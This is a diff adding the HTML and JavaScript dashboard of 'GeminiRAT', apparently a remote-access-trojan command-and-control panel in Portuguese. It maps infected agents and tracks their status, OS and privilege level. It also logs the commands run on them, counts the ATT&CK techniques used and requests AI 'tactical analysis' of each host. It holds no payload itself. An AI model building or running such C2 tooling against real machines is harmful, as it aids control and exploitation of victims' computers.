@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dashboard · GeminiRAT</title>
+
+<link rel="stylesheet" href="{{ url_for('static', filename='css/c2-theme.css') }}">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+<style>
+  body { display: flex; flex-direction: column; min-height: 100vh; }
+  main { flex: 1; padding: 16px 20px; display: grid; grid-template-columns: 1fr 2fr; gap: 16px; }
+  @media (max-width: 1024px) { main { grid-template-columns: 1fr; } }
+
+  /* KPI grid */
+  .kpi-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+  /* Map */
+  #map { width: 100%; height: 440px; border-radius: 6px; border: 1px solid var(--border); }
+
+  /* Feed */
+  #activity-feed { max-height: 220px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+  .feed-item { display: flex; align-items: flex-start; gap: 10px; font-size: 11px; padding: 6px 0; border-bottom: 1px solid var(--border); }
+  .feed-icon { font-weight: 700; width: 14px; flex-shrink: 0; }
+
+  /* Modal scroll */
+  #gemini-analysis-content { max-height: 60vh; overflow-y: auto; padding: 16px; line-height: 1.7; }
+  #gemini-analysis-content h3 { color: var(--cyan); margin: 14px 0 6px; font-size: 13px; letter-spacing: 1px; }
+  #gemini-analysis-content h4 { color: #00c8c0; margin: 10px 0 4px; font-size: 12px; }
+
+  /* Lookup */
+  .lookup-btn {
+    width: 100%; background: transparent; border: 1px solid var(--cyan-dim);
+    border-radius: 4px; color: var(--cyan); font-family: var(--font);
+    font-size: 10px; letter-spacing: 3px; text-transform: uppercase;
+    padding: 9px; cursor: pointer; margin-top: 4px;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .lookup-btn:hover { border-color: var(--cyan); box-shadow: 0 0 14px rgba(0,212,255,.2); }
+
+  /* Chart containers */
+  .chart-wrap { position: relative; height: 180px; }
+  .chart-wrap-sm { position: relative; max-height: 180px; }
+
+  /* MITRE ATT&CK */
+  #mitre-section { padding: 0 20px 20px; }
+  .mitre-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-top: 12px; }
+  .mitre-tactic { background: var(--card-bg, #0d0d1a); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+  .mitre-tactic-header { padding: 7px 10px; font-size: 9px; letter-spacing: 2px; text-transform: uppercase; font-weight: 700; }
+  .mitre-technique { padding: 6px 10px; border-top: 1px solid rgba(255,255,255,.04); }
+  .mitre-technique-id { font-size: 9px; letter-spacing: 1px; color: var(--cyan); font-weight: 700; }
+  .mitre-technique-name { font-size: 10px; color: var(--text-muted); margin: 1px 0 4px; line-height: 1.3; }
+  .mitre-bar-wrap { height: 3px; background: rgba(255,255,255,.06); border-radius: 2px; }
+  .mitre-bar { height: 3px; border-radius: 2px; transition: width .4s ease; }
+  .mitre-count { font-size: 9px; color: var(--text-muted); margin-top: 2px; text-align: right; }
+  .mitre-empty { padding: 16px 10px; font-size: 10px; color: var(--text-muted); text-align: center; }
+  .tactic-execution    { background: rgba(123,47,255,.15); color: #a78bfa; }
+  .tactic-discovery    { background: rgba(0,212,255,.12); color: #00d4ff; }
+  .tactic-collection   { background: rgba(0,200,192,.12); color: #00c8c0; }
+  .tactic-credential   { background: rgba(255,189,46,.12); color: #ffbd2e; }
+  .tactic-persistence  { background: rgba(255,100,50,.12); color: #ff6432; }
+  .tactic-privilege    { background: rgba(255,0,85,.12); color: #ff0055; }
+  .tactic-lateral      { background: rgba(0,255,136,.12); color: #00ff88; }
+  .tactic-impact       { background: rgba(255,50,50,.12); color: #ff3232; }
+
+  /* Connection status */
+  .conn-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .conn-online { background: var(--green); box-shadow: 0 0 6px var(--green); }
+  .conn-offline { background: var(--red); box-shadow: 0 0 6px var(--red); }
+  .conn-pending { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+
+  /* Gemini loading */
+  .ai-loading { text-align: center; padding: 32px; }
+  .ai-spinner {
+    width: 40px; height: 40px; border-radius: 50%;
+    border: 2px solid var(--border2);
+    border-top-color: var(--cyan);
+    animation: spin .8s linear infinite;
+    margin: 16px auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="c2-header">
+  <div>
+    <div class="c2-header-title">Dashboard Operacional</div>
+    <div class="c2-header-sub">Visão geral · GeminiRAT</div>
+  </div>
+  <div class="c2-header-right">
+    <a href="/" style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--cyan)">← Painel</a>
+    <div style="display:flex;align-items:center;gap:8px;">
+      <div class="conn-dot conn-pending" id="connection-status-dot"></div>
+      <span id="connection-status-text" style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--yellow)">Conectando...</span>
+    </div>
+  </div>
+</header>
+
+<main>
+  <!-- Coluna esquerda -->
+  <div style="display:flex;flex-direction:column;gap:14px;">
+
+    <!-- KPIs -->
+    <div class="kpi-grid">
+      <div class="c2-kpi">
+        <div class="c2-kpi-icon c2-kpi-icon-green">
+          <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.636 18.364a9 9 0 010-12.728m12.728 0a9 9 0 010 12.728m-9.9-2.829a5 5 0 010-7.07m7.072 0a5 5 0 010 7.07M12 6v6l4 2"/></svg>
+        </div>
+        <div>
+          <div class="c2-kpi-label">Ativos</div>
+          <div class="c2-kpi-value" id="kpi-online-agents">0</div>
+        </div>
+      </div>
+      <div class="c2-kpi">
+        <div class="c2-kpi-icon c2-kpi-icon-red">
+          <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/></svg>
+        </div>
+        <div>
+          <div class="c2-kpi-label">Inativos</div>
+          <div class="c2-kpi-value" id="kpi-offline-agents">0</div>
+        </div>
+      </div>
+      <div class="c2-kpi">
+        <div class="c2-kpi-icon c2-kpi-icon-cyan">
+          <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7h16M4 12h16M4 17h16"/></svg>
+        </div>
+        <div>
+          <div class="c2-kpi-label">Total</div>
+          <div class="c2-kpi-value" id="kpi-total-agents">0</div>
+        </div>
+      </div>
+      <div class="c2-kpi">
+        <div class="c2-kpi-icon c2-kpi-icon-yellow">
+          <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+        </div>
+        <div>
+          <div class="c2-kpi-label">Último Check-in</div>
+          <div class="c2-kpi-value" id="kpi-last-checkin-host" style="font-size:14px;">N/A</div>
+          <div class="c2-kpi-sub" id="kpi-last-checkin-time">Nunca</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Ferramentas de análise externa -->
+    <div class="c2-card">
+      <div class="c2-card-title">Análise Externa</div>
+      <div style="display:flex;flex-direction:column;gap:10px;">
+        <div>
+          <label>Tipo de Consulta</label>
+          <select id="lookup-type">
+            <option value="ip">IP (VirusTotal, Shodan)</option>
+            <option value="domain">Domínio (VirusTotal)</option>
+            <option value="hash">Hash (VirusTotal)</option>
+            <option value="cve">CVE (Exploit-DB)</option>
+          </select>
+        </div>
+        <div>
+          <label>Alvo</label>
+          <input type="text" id="lookup-value" placeholder="IP, domínio, hash ou CVE...">
+        </div>
+        <button id="lookup-button" class="lookup-btn">Consultar</button>
+      </div>
+    </div>
+
+    <!-- Gráfico de atividade -->
+    <div class="c2-card" style="flex:1;">
+      <div class="c2-card-title">Check-ins · Últimas 24h</div>
+      <div class="chart-wrap"><canvas id="activityChart"></canvas></div>
+    </div>
+
+    <!-- Gráficos menores -->
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+      <div class="c2-card">
+        <div class="c2-card-title">SO</div>
+        <div class="chart-wrap-sm"><canvas id="osChart"></canvas></div>
+      </div>
+      <div class="c2-card">
+        <div class="c2-card-title">Privilégios</div>
+        <div class="chart-wrap-sm"><canvas id="privilegesChart"></canvas></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Coluna direita -->
+  <div style="display:flex;flex-direction:column;gap:14px;">
+    <div class="c2-card" style="flex:1;">
+      <div class="c2-card-title">Mapa de Agentes</div>
+      <div id="map"></div>
+    </div>
+    <div class="c2-card">
+      <div class="c2-card-title">Feed de Atividades</div>
+      <div id="activity-feed"><p style="color:var(--text-muted);font-size:11px;">Aguardando atividades...</p></div>
+    </div>
+  </div>
+</main>
+
+<!-- MITRE ATT&CK Coverage -->
+<section id="mitre-section">
+  <div class="c2-card">
+    <div style="display:flex;align-items:center;justify-content:space-between;">
+      <div class="c2-card-title">MITRE ATT&amp;CK · Cobertura de Técnicas</div>
+      <button id="mitre-refresh-btn" onclick="loadMitreStats()" style="background:transparent;border:1px solid var(--border);border-radius:4px;color:var(--cyan);font-family:var(--font);font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:5px 10px;cursor:pointer;">↺ Atualizar</button>
+    </div>
+    <div id="mitre-container">
+      <div class="mitre-empty">Carregando dados ATT&amp;CK...</div>
+    </div>
+  </div>
+</section>
+
+<!-- Modal análise Gemini -->
+<div id="gemini-analysis-modal" class="c2-modal-backdrop hidden">
+  <div class="c2-modal">
+    <div class="c2-modal-header">
+      <div class="c2-modal-title">◈ Análise Tática IA</div>
+      <button class="c2-modal-close" onclick="closeAnalysisModal()">✕</button>
+    </div>
+    <div id="gemini-analysis-content">
+      <div id="gemini-loading" class="ai-loading">
+        <div style="color:var(--cyan);font-size:10px;letter-spacing:3px;text-transform:uppercase;">Consultando IA...</div>
+        <div class="ai-spinner"></div>
+        <div style="color:var(--text-muted);font-size:10px;margin-top:8px;">Isso pode levar alguns segundos.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+
+  // --- CONFIGURAÇÃO INICIAL ---
+  const notyf = new Notyf({
+    duration: 5000,
+    position: { x: 'right', y: 'top' },
+    types: [
+      { type: 'success', background: '#0d0d1a', icon: false },
+      { type: 'error',   background: '#0d0d1a', icon: false },
+      { type: 'info',    background: '#0d0d1a', icon: false }
+    ]
+  });
+
+  const map = L.map('map').setView([-14.235, -51.925], 4);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
+    maxZoom: 19
+  }).addTo(map);
+  let markersLayer = L.layerGroup().addTo(map);
+  let activityChart, osChart, privilegesChart;
+
+  const onlineIcon = L.divIcon({
+    html: `<div style="width:12px;height:12px;border-radius:50%;background:#00ff88;box-shadow:0 0 8px #00ff88;border:2px solid rgba(255,255,255,.3);"></div>`,
+    className: '', iconSize: [12, 12], iconAnchor: [6, 6], popupAnchor: [0, -10]
+  });
+  const offlineIcon = L.divIcon({
+    html: `<div style="width:12px;height:12px;border-radius:50%;background:#ff0055;box-shadow:0 0 8px #ff0055;border:2px solid rgba(255,255,255,.3);"></div>`,
+    className: '', iconSize: [12, 12], iconAnchor: [6, 6], popupAnchor: [0, -10]
+  });
+
+  // --- FERRAMENTAS DE ANÁLISE EXTERNA ---
+  function performLookup() {
+    const type  = document.getElementById('lookup-type').value;
+    const value = document.getElementById('lookup-value').value.trim();
+    if (!value) { notyf.error('Insira um alvo para a consulta.'); return; }
+    let urls = [];
+    switch (type) {
+      case 'ip':
+        urls.push(`https://www.virustotal.com/gui/ip-address/${value}`,
+                  `https://www.shodan.io/host/${value}`,
+                  `https://www.abuseipdb.com/check/${value}`);
+        break;
+      case 'domain': urls.push(`https://www.virustotal.com/gui/domain/${value}`); break;
+      case 'hash':   urls.push(`https://www.virustotal.com/gui/file/${value}`); break;
+      case 'cve':
+        const p = value.toUpperCase().split('-');
+        if (p.length === 3 && p[0] === 'CVE') {
+          urls.push(`https://www.exploit-db.com/search?cve=${p[1]}-${p[2]}`);
+        } else { notyf.error('Formato inválido. Use: CVE-ANO-NÚMERO'); return; }
+        break;
+    }
+    urls.forEach(u => window.open(u, '_blank').focus());
+  }
+  document.getElementById('lookup-button').addEventListener('click', performLookup);
+  document.getElementById('lookup-value').addEventListener('keyup', e => { if (e.key === 'Enter') performLookup(); });
+
+  // --- ANÁLISE GEMINI ---
+  window.showAnalysisModal = function(agent) {
+    const agentId = typeof agent === 'string' ? agent : agent?.id;
+    if (!agentId) { notyf.error('ID do agente inválido.'); return; }
+    document.getElementById('gemini-analysis-modal').classList.remove('hidden');
+    document.getElementById('gemini-analysis-content').innerHTML =
+      `<div class="ai-loading"><div style="color:var(--cyan);font-size:10px;letter-spacing:3px;text-transform:uppercase;">Consultando IA...</div><div class="ai-spinner"></div></div>`;
+    fetchGeminiAnalysis(agentId);
+  };
+  window.closeAnalysisModal = function() {
+    document.getElementById('gemini-analysis-modal').classList.add('hidden');
+  };
+  function fetchGeminiAnalysis(agentId) {
+    fetch('/api/analyze_agent', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ agent_id: agentId }),
+    })
+    .then(r => {
+      if (!r.ok) return r.json().then(e => { throw new Error(e.details || e.error || `Status ${r.status}`); });
+      return r.json();
+    })
+    .then(data => {
+      if (data.analysis) {
+        let html = data.analysis
+          .replace(/# (.*?)\n/g,  '<h3>$1</h3>')
+          .replace(/## (.*?)\n/g, '<h4>$1</h4>')
+          .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+          .replace(/\*(.*?)\*/g,   '<em>$1</em>')
+          .replace(/\n/g, '<br>');
+        document.getElementById('gemini-analysis-content').innerHTML = html;
+      } else throw new Error('Resposta da IA sem análise válida.');
+    })
+    .catch(err => {
+      document.getElementById('gemini-analysis-content').innerHTML =
+        `<p style="color:var(--red);font-size:11px;"><strong>Erro:</strong> ${err.message}</p>`;
+    });
+  }
+
+  // --- WEBSOCKET ---
+  const socket = io();
+  socket.on('connect', () => {
+    const dot  = document.getElementById('connection-status-dot');
+    const text = document.getElementById('connection-status-text');
+    dot.className  = 'conn-dot conn-online';
+    text.textContent = 'Online';
+    text.style.color = 'var(--green)';
+    socket.emit('request_dashboard_data');
+    previousAgentCount = 0;
+  });
+  socket.on('disconnect', () => {
+    const dot  = document.getElementById('connection-status-dot');
+    const text = document.getElementById('connection-status-text');
+    dot.className  = 'conn-dot conn-offline';
+    text.textContent = 'Desconectado';
+    text.style.color = 'var(--red)';
+  });
+  let previousAgentCount = 0;
+  socket.on('dashboard_update', (data) => {
+    if (!data) return;
+    const newCount = data.kpis?.total_agents || 0;
+    if (previousAgentCount > 0 && newCount > previousAgentCount) {
+      notyf.open({ type: 'info', message: 'Novo agente registrado!' });
+      const kpiCard = document.querySelector('#kpi-online-agents')?.closest('.c2-kpi');
+      if (kpiCard) { kpiCard.classList.add('pulse-effect'); setTimeout(() => kpiCard.classList.remove('pulse-effect'), 5000); }
+    }
+    previousAgentCount = newCount;
+    updateKPIs(data.kpis);
+    updateMap(data.map_data);
+    updateActivityFeed(data.activity_feed);
+    updateCharts(data.charts);
+  });
+
+  // --- ATUALIZAÇÃO DA UI ---
+  function updateKPIs(kpis) {
+    document.getElementById('kpi-online-agents').textContent  = kpis.online_agents  || 0;
+    document.getElementById('kpi-offline-agents').textContent = kpis.offline_agents || 0;
+    document.getElementById('kpi-total-agents').textContent   = kpis.total_agents   || 0;
+    if (kpis.last_checkin?.hostname) {
+      document.getElementById('kpi-last-checkin-host').textContent = kpis.last_checkin.hostname;
+      document.getElementById('kpi-last-checkin-time').textContent = formatTimeAgo(new Date(kpis.last_checkin.time));
+    } else {
+      document.getElementById('kpi-last-checkin-host').textContent = 'N/A';
+      document.getElementById('kpi-last-checkin-time').textContent = 'Nunca';
+    }
+  }
+  function updateMap(agents) {
+    markersLayer.clearLayers();
+    if (!agents?.length) return;
+    agents.forEach(agent => {
+      const icon   = agent.status === 'online' ? onlineIcon : offlineIcon;
+      const marker = L.marker([agent.lat, agent.lon], { icon }).addTo(markersLayer);
+      const loc    = (agent.city && agent.country) ? `${agent.city}, ${agent.country}` : 'Desconhecido';
+      const statusColor = agent.status === 'online' ? '#00ff88' : '#ff0055';
+      marker.bindPopup(`
+        <div style="font-family:Consolas,monospace;font-size:11px;min-width:180px;">
+          <div style="color:#00d4ff;font-size:12px;font-weight:700;margin-bottom:6px;">${agent.hostname}</div>
+          <div style="color:#b0c4d8;line-height:1.8;">
+            IP: ${agent.ip}<br>
+            SO: ${agent.os}<br>
+            Status: <span style="color:${statusColor};font-weight:700;">${agent.status}</span><br>
+            Local: ${loc}
+          </div>
+          <button onclick='showAnalysisModal(${JSON.stringify(agent)})'
+            style="margin-top:8px;width:100%;background:transparent;border:1px solid #005f72;border-radius:3px;color:#00d4ff;font-family:Consolas,monospace;font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:5px;cursor:pointer;">
+            ◈ Analisar
+          </button>
+        </div>`);
+    });
+  }
+  function updateActivityFeed(feed) {
+    const el = document.getElementById('activity-feed');
+    if (!feed?.length) { el.innerHTML = '<p style="color:var(--text-muted);font-size:11px;">Nenhuma atividade recente.</p>'; return; }
+    el.innerHTML = feed.map(item => {
+      const [color, icon] = item.status === 'concluido' ? ['var(--green)','✓'] :
+                            item.status === 'executando' ? ['var(--yellow)','…'] :
+                            item.status === 'erro'       ? ['var(--red)','✗']   : ['var(--cyan)','»'];
+      return `<div class="feed-item">
+        <div class="feed-icon" style="color:${color}">${icon}</div>
+        <div style="flex:1;min-width:0;">
+          <div style="color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${item.command}</div>
+          <div style="color:var(--text-muted);font-size:10px;">${formatTimeAgo(new Date(item.timestamp))}</div>
+        </div>
+        <div style="color:${color};font-size:10px;letter-spacing:1px;text-transform:uppercase;flex-shrink:0;">${item.status}</div>
+      </div>`;
+    }).join('');
+  }
+  function updateCharts(cd) {
+    if (!cd) return;
+    if (cd.activity) {
+      if (!activityChart) {
+        activityChart = new Chart(document.getElementById('activityChart').getContext('2d'), {
+          type: 'line',
+          data: { labels: cd.activity.labels, datasets: [{ label: 'Check-ins', data: cd.activity.data,
+            borderColor: '#00d4ff', backgroundColor: 'rgba(0,212,255,.08)', tension: .3, fill: true,
+            pointBackgroundColor: '#00d4ff', pointRadius: 3 }] },
+          options: lineOpts()
+        });
+      } else {
+        activityChart.data.labels = cd.activity.labels;
+        activityChart.data.datasets[0].data = cd.activity.data;
+        activityChart.update('none');
+      }
+    }
+    if (cd.os_distribution) {
+      if (!osChart) {
+        osChart = new Chart(document.getElementById('osChart').getContext('2d'), {
+          type: 'doughnut',
+          data: { labels: cd.os_distribution.labels, datasets: [{ data: cd.os_distribution.data,
+            backgroundColor: ['#00d4ff','#7b2fff','#00c8c0','#ffbd2e','#005f72'],
+            borderColor: '#0d0d1a', borderWidth: 2 }] },
+          options: doughnutOpts()
+        });
+      } else {
+        osChart.data.labels = cd.os_distribution.labels;
+        osChart.data.datasets[0].data = cd.os_distribution.data;
+        osChart.update('none');
+      }
+    }
+    if (cd.privileges_distribution) {
+      if (!privilegesChart) {
+        privilegesChart = new Chart(document.getElementById('privilegesChart').getContext('2d'), {
+          type: 'doughnut',
+          data: { labels: cd.privileges_distribution.labels, datasets: [{ data: cd.privileges_distribution.data,
+            backgroundColor: ['#ff0055','#00ff88','#4a5a6e'],
+            borderColor: '#0d0d1a', borderWidth: 2 }] },
+          options: doughnutOpts()
+        });
+      } else {
+        privilegesChart.data.labels = cd.privileges_distribution.labels;
+        privilegesChart.data.datasets[0].data = cd.privileges_distribution.data;
+        privilegesChart.update('none');
+      }
+    }
+  }
+
+  // --- UTILITÁRIOS ---
+  function formatTimeAgo(date) {
+    const s = Math.floor((new Date() - date) / 1000);
+    if (s < 60)   return 'Agora mesmo';
+    if (s < 3600) return Math.floor(s/60) + ' min atrás';
+    if (s < 86400)return Math.floor(s/3600) + ' h atrás';
+    return Math.floor(s/86400) + ' dias atrás';
+  }
+  function lineOpts() {
+    return { responsive: true, maintainAspectRatio: false,
+      scales: {
+        y: { beginAtZero: true, ticks: { color: '#4a5a6e', font: { family: 'Consolas' } }, grid: { color: '#1a1a35' } },
+        x: { ticks: { color: '#4a5a6e', font: { family: 'Consolas' } }, grid: { color: '#1a1a35' } }
+      },
+      plugins: { legend: { display: false } }
+    };
+  }
+  function doughnutOpts() {
+    return { responsive: true, maintainAspectRatio: false,
+      plugins: { legend: { position: 'bottom', labels: { color: '#4a5a6e', font: { family: 'Consolas' }, padding: 8 } } }
+    };
+  }
+
+  // --- MITRE ATT&CK ---
+  const TACTIC_CLASS = {
+    'Execution':          'tactic-execution',
+    'Discovery':          'tactic-discovery',
+    'Collection':         'tactic-collection',
+    'Credential Access':  'tactic-credential',
+    'Persistence':        'tactic-persistence',
+    'Privilege Escalation': 'tactic-privilege',
+    'Lateral Movement':   'tactic-lateral',
+    'Impact':             'tactic-impact',
+  };
+
+  window.loadMitreStats = function() {
+    const container = document.getElementById('mitre-container');
+    container.innerHTML = '<div class="mitre-empty">Carregando...</div>';
+    fetch('/api/mitre_stats')
+      .then(r => r.json())
+      .then(data => renderMitre(data))
+      .catch(() => { container.innerHTML = '<div class="mitre-empty" style="color:var(--red)">Erro ao carregar dados ATT&CK.</div>'; });
+  };
+
+  function renderMitre(data) {
+    const container = document.getElementById('mitre-container');
+    const order     = data.tactic_order || [];
+    const byTactic  = data.by_tactic   || {};
+
+    // Calcula o max global para normalizar as barras
+    let maxCount = 1;
+    order.forEach(t => (byTactic[t] || []).forEach(te => { if (te.count > maxCount) maxCount = te.count; }));
+
+    const hasAny = order.some(t => (byTactic[t] || []).length > 0);
+    if (!hasAny) {
+      container.innerHTML = '<div class="mitre-empty">Nenhuma técnica registrada ainda. Execute comandos nos agentes para popular o mapa ATT&amp;CK.</div>';
+      return;
+    }
+
+    const grid = document.createElement('div');
+    grid.className = 'mitre-grid';
+
+    order.forEach(tactic => {
+      const techniques = byTactic[tactic] || [];
+      if (!techniques.length) return;
+
+      const col = document.createElement('div');
+      col.className = 'mitre-tactic';
+
+      const cls = TACTIC_CLASS[tactic] || 'tactic-discovery';
+      col.innerHTML = `<div class="mitre-tactic-header ${cls}">${tactic}</div>`;
+
+      techniques.forEach(te => {
+        const pct  = Math.max(8, Math.round((te.count / maxCount) * 100));
+        const barColor = getComputedStyle(col.querySelector(`.${cls}`)).color || '#00d4ff';
+        col.innerHTML += `
+          <div class="mitre-technique">
+            <div class="mitre-technique-id">${te.technique_id}</div>
+            <div class="mitre-technique-name">${te.name}</div>
+            <div class="mitre-bar-wrap"><div class="mitre-bar" style="width:${pct}%;background:${barColor};opacity:.8;"></div></div>
+            <div class="mitre-count">${te.count}× · ${te.commands.join(', ')}</div>
+          </div>`;
+      });
+
+      grid.appendChild(col);
+    });
+
+    container.innerHTML = '';
+    container.appendChild(grid);
+  }
+
+  // Carrega MITRE ao conectar
+  socket.on('connect', () => { loadMitreStats(); });
+
+}); // fim DOMContentLoaded
+</script>
+</body>
+</html>
